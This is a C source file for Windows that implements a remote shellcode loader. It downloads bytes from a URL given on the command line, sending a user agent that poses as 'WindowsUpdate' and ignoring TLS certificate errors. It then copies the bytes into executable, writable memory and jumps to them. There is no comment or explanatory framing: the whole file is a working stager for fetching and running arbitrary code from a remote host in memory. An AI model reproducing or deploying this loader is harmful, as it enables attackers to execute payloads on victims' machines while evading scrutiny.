#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "wininet.lib")

PBYTE HTTPGet( LPCWSTR host, INTERNET_PORT port, LPCWSTR path, PDWORD outLen, BOOL useSSL ) {

    HINTERNET hSession = WinHttpOpen( L"WindowsUpdate/1.0",
        WINHTTP_ACCESS_TYPE_NO_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0 );
    if ( !hSession ) {
        return NULL;
    }

    HINTERNET hConnect = WinHttpConnect( hSession, host, port, 0 );
    if ( !hConnect ) {
        WinHttpCloseHandle( hSession );
        return NULL;
    }

    DWORD flags = useSSL ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hRequest = WinHttpOpenRequest( hConnect, L"GET", path,
        NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags );
    if ( !hRequest ) {
        WinHttpCloseHandle( hConnect );
        WinHttpCloseHandle( hSession );
        return NULL;
    }

    if ( useSSL ) {
        DWORD securityFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
            SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
            SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
        WinHttpSetOption( hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &securityFlags, sizeof( securityFlags ) );
    }

    if ( !WinHttpSendRequest( hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
        WINHTTP_NO_REQUEST_DATA, 0, 0, 0 ) ) {
        WinHttpCloseHandle( hRequest );
        WinHttpCloseHandle( hConnect );
        WinHttpCloseHandle( hSession );
        return NULL;
    }

    if ( !WinHttpReceiveResponse( hRequest, NULL ) ) {
        WinHttpCloseHandle( hRequest );
        WinHttpCloseHandle( hConnect );
        WinHttpCloseHandle( hSession );
        return NULL;
    }

    PBYTE buffer = NULL;
    DWORD size = 0, avail = 0, read = 0;
    do {
        if ( !WinHttpQueryDataAvailable( hRequest, &avail ) || avail == 0 ) break;
        buffer = ( PBYTE )realloc( buffer, size + avail );
        if ( !buffer ) {
            *outLen = 0;
            WinHttpCloseHandle( hRequest );
            WinHttpCloseHandle( hConnect );
            WinHttpCloseHandle( hSession );
            return NULL;
        }
        if ( !WinHttpReadData( hRequest, buffer + size, avail, &read ) || read == 0 ) break;
        size += read;
    } while ( avail > 0 );

    *outLen = size;
    WinHttpCloseHandle( hRequest );
    WinHttpCloseHandle( hConnect );
    WinHttpCloseHandle( hSession );
    return buffer;
}

int wmain( int argc, wchar_t* argv[] ) {

    if ( argc != 2 ) {
        wprintf( L"Usage: %ls <URL>\n", argv[ 0 ] );
        return 1;
    }
    LPWSTR url = argv[ 1 ];

    wchar_t schemeBuffer[ 256 ] = { 0 };
    wchar_t hostBuffer[ 256 ] = { 0 };
    wchar_t pathBuffer[ 1024 ] = { 0 };

    URL_COMPONENTS urlComponents = { 0 };
    urlComponents.dwStructSize = sizeof( URL_COMPONENTS );
    urlComponents.lpszScheme = schemeBuffer;
    urlComponents.dwSchemeLength = 256;
    urlComponents.lpszHostName = hostBuffer;
    urlComponents.dwHostNameLength = 256;
    urlComponents.lpszUrlPath = pathBuffer;
    urlComponents.dwUrlPathLength = 1024;

    if ( !WinHttpCrackUrl( argv[ 1 ], 0, 0, &urlComponents ) ) {
        wprintf( L"Invalid URL: %ls\n", url );
        return 1;
    }

    BOOL useSSL = ( wcscmp( schemeBuffer, L"https" ) == 0 );

    if ( useSSL && urlComponents.nPort == 0 ) {
        urlComponents.nPort = INTERNET_DEFAULT_HTTPS_PORT;
    }
    else if ( !useSSL && urlComponents.nPort == 0 ) {
        urlComponents.nPort = INTERNET_DEFAULT_HTTP_PORT;
    }

    DWORD len = 0;
    PBYTE data = HTTPGet( hostBuffer, urlComponents.nPort, pathBuffer, &len, useSSL );
    if ( !data || len == 0 ) {
        wprintf( L"Failed to download data from %ls\n", url );
        return 1;
    }

    PVOID exec_mem = VirtualAlloc( NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE );
    if ( !exec_mem ) {
        wprintf( L"Failed to allocate executable memory\n" );
        free( data );
        return 1;
    }
    memcpy( exec_mem, data, len );
    free( data );

    ( ( void( * )( ) )exec_mem )( );

    VirtualFree( exec_mem, 0, MEM_RELEASE );
    return 0;
}